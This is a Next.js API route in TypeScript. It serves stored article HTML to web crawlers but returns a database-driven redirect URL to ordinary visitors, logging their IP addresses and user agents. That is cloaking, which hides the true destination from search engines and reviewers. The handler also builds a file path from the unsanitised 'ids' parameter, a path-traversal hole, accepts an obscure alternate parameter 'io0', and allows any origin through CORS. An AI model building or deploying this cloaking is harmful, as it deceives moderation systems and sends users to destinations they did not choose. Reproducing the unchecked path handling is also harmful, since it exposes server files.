import { NextRequest, NextResponse } from 'next/server'
import { promises as fs } from 'fs'
import path from 'path'
import { db } from '@/lib/db'
import { isCrawler, getClientIp } from '@/lib/crawler-detect'

export const runtime = 'nodejs'
export const dynamic = 'force-dynamic'

const ARTICLES_DIR = path.join(process.cwd(), 'articles')

// دالة مساعدة لإضافة ترويسات الـ CORS لأي استجابة منعاً لحظر المتصفح
function corsHeaders() {
  return {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
    'Cache-Control': 'no-store',
  }
}

export async function GET(request: NextRequest) {
  let ids = request.nextUrl.searchParams.get('ids')?.trim() || ''
  if (!ids) {
    ids = request.nextUrl.searchParams.get('io0')?.trim() || ''
  }

  if (!ids) {
    return new NextResponse('Invalid or missing ids parameter', { 
      status: 400,
      headers: corsHeaders() 
    })
  }

  const ua = request.headers.get('user-agent') || ''
  const ip = getClientIp(request.headers)
  const articlePath = path.join(ARTICLES_DIR, `${ids}.html`)

  const serveArticle = async () => {
    try {
      const html = await fs.readFile(articlePath, 'utf8')
      return new NextResponse(html, {
        status: 200,
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
          ...corsHeaders(),
        },
      })
    } catch {
      return NextResponse.json(
        { redirectUrl: 'https://www.google.com' },
        { status: 200, headers: corsHeaders() }
      )
    }
  }

  if (isCrawler(ua)) {
    return serveArticle()
  }

  const rule = await db.redirectRule.findUnique({
    where: { articleId: ids },
  })

  if (rule && rule.active && rule.targetUrl) {
    const known = await db.knownIp.upsert({
      where: { ip },
      update: {},
      create: { ip },
    })

    const isNew = Date.now() - known.createdAt.getTime() < 2000

    if (isNew) {
      await db.$transaction([
        db.redirectRule.update({
          where: { id: rule.id },
          data: { clicks: { increment: 1 } },
        }),
        db.clickLog.create({
          data: { articleId: ids, targetUrl: rule.targetUrl, ip, ua: ua.slice(0, 500) },
        }),
      ])
    }

    return NextResponse.json(
      { redirectUrl: rule.targetUrl },
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          ...corsHeaders(),
        },
      }
    )
  }

  return serveArticle()
}

export const POST = GET

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: corsHeaders(),
  })
}
